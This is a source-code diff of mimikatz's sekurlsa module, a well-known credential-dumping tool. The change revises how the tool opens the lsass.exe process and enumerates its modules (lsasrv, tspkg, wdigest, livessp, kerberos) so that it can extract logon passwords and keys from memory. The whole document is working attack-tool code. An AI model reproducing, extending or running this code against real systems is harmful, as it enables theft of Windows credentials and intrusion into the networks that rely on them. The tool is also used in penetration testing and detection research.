@@ -7,7 +7,7 @@
 #include "mod_mimikatz_sekurlsa.h"
 HMODULE mod_mimikatz_sekurlsa::hLsaSrv = NULL;
 HANDLE mod_mimikatz_sekurlsa::hLSASS = NULL;
-mod_process::PKIWI_MODULEENTRY32 mod_mimikatz_sekurlsa::pModLSASRV = NULL;
+mod_process::PKIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa::pModLSASRV = NULL;
 PLSA_SECPKG_FUNCTION_TABLE mod_mimikatz_sekurlsa::SeckPkgFunctionTable = NULL;
 PBYTE * mod_mimikatz_sekurlsa::g_pRandomKey = NULL, * mod_mimikatz_sekurlsa::g_pDESXKey = NULL;
 bool mod_mimikatz_sekurlsa::population = false;
@@ -71,7 +71,9 @@ vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_sekurlsa::getMimiKatzCom
 
 bool mod_mimikatz_sekurlsa::getLogonPasswords(vector<wstring> * arguments)
 {
-	return (searchLSASSDatas() ? getLogonData(arguments, &GLOB_ALL_Providers) : false);
+	if(searchLSASSDatas())
+		getLogonData(arguments, &GLOB_ALL_Providers);
+	return true;
 }
 
 bool mod_mimikatz_sekurlsa::loadLsaSrv()
@@ -117,47 +119,49 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 			wstring processName = L"lsass.exe";
 			if(mod_process::getUniqueForName(&monProcess, &processName))
 			{
-				hLSASS = OpenProcess(PROCESS_VM_READ, false, monProcess.th32ProcessID);
-				vector<mod_process::KIWI_MODULEENTRY32> monVecteurModules;
-				if(mod_process::getModulesListForProcessId(&monVecteurModules, &monProcess.th32ProcessID))
+				if(hLSASS = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, monProcess.th32ProcessID))
 				{
-					for(vector<mod_process::KIWI_MODULEENTRY32>::iterator leModule = monVecteurModules.begin(); leModule != monVecteurModules.end(); leModule++)
+					vector<mod_process::KIWI_VERY_BASIC_MODULEENTRY> monVecteurModules;
+					if(mod_process::getVeryBasicModulesListForProcess(&monVecteurModules, hLSASS))
 					{
-						mod_process::PKIWI_MODULEENTRY32 * lePointeur = NULL;
+						for(vector<mod_process::KIWI_VERY_BASIC_MODULEENTRY>::iterator leModule = monVecteurModules.begin(); leModule != monVecteurModules.end(); leModule++)
+						{
+							mod_process::PKIWI_VERY_BASIC_MODULEENTRY * lePointeur = NULL;
 
-						if((_wcsicmp(leModule->szModule.c_str(), L"lsasrv.dll") == 0) && !pModLSASRV)
-						{
-							lePointeur = &pModLSASRV;
-							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_msv1_0::getMSVLogonData, wstring(L"msv1_0")));
-						}
-						else if((_wcsicmp(leModule->szModule.c_str(), L"tspkg.dll") == 0) && !mod_mimikatz_sekurlsa_tspkg::pModTSPKG)
-						{
-							lePointeur = &mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
-							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData, wstring(L"tspkg")));
-						}
-						else if((_wcsicmp(leModule->szModule.c_str(), L"wdigest.dll") == 0) && !mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
-						{
-							lePointeur = &mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;
-							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData, wstring(L"wdigest")));
-						}
-						else if((_wcsicmp(leModule->szModule.c_str(), L"livessp.dll") == 0) && !mod_mimikatz_sekurlsa_livessp::pModLIVESSP && (mod_system::GLOB_Version.dwBuildNumber >= 8000))
-						{
-							lePointeur = &mod_mimikatz_sekurlsa_livessp::pModLIVESSP;
-							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_livessp::getLiveSSPLogonData, wstring(L"livessp")));
-						}
-						else if((_wcsicmp(leModule->szModule.c_str(), L"kerberos.dll") == 0) && !mod_mimikatz_sekurlsa_kerberos::pModKERBEROS)
-						{
-							lePointeur = &mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
-							GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData, wstring(L"kerberos")));
-						}
+							if((_wcsicmp(leModule->szModule.c_str(), L"lsasrv.dll") == 0) && !pModLSASRV)
+							{
+								lePointeur = &pModLSASRV;
+								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_msv1_0::getMSVLogonData, wstring(L"msv1_0")));
+							}
+							else if((_wcsicmp(leModule->szModule.c_str(), L"tspkg.dll") == 0) && !mod_mimikatz_sekurlsa_tspkg::pModTSPKG)
+							{
+								lePointeur = &mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
+								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_tspkg::getTsPkgLogonData, wstring(L"tspkg")));
+							}
+							else if((_wcsicmp(leModule->szModule.c_str(), L"wdigest.dll") == 0) && !mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
+							{
+								lePointeur = &mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;
+								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData, wstring(L"wdigest")));
+							}
+							else if((_wcsicmp(leModule->szModule.c_str(), L"livessp.dll") == 0) && !mod_mimikatz_sekurlsa_livessp::pModLIVESSP && (mod_system::GLOB_Version.dwBuildNumber >= 8000))
+							{
+								lePointeur = &mod_mimikatz_sekurlsa_livessp::pModLIVESSP;
+								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_livessp::getLiveSSPLogonData, wstring(L"livessp")));
+							}
+							else if((_wcsicmp(leModule->szModule.c_str(), L"kerberos.dll") == 0) && !mod_mimikatz_sekurlsa_kerberos::pModKERBEROS)
+							{
+								lePointeur = &mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
+								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData, wstring(L"kerberos")));
+							}
 						
-						if(lePointeur)
-							*lePointeur = new mod_process::KIWI_MODULEENTRY32(*leModule);
+							if(lePointeur)
+								*lePointeur = new mod_process::KIWI_VERY_BASIC_MODULEENTRY(*leModule);
+						}
+					} else {
+						CloseHandle(hLSASS);
+						hLSASS = NULL;
 					}
-				} else {
-					CloseHandle(hLSASS);
-					hLSASS = NULL;
-				}
+				} else wcout << L"OpenProcess : " << mod_system::getWinError() << endl;
 			}
 		}
 
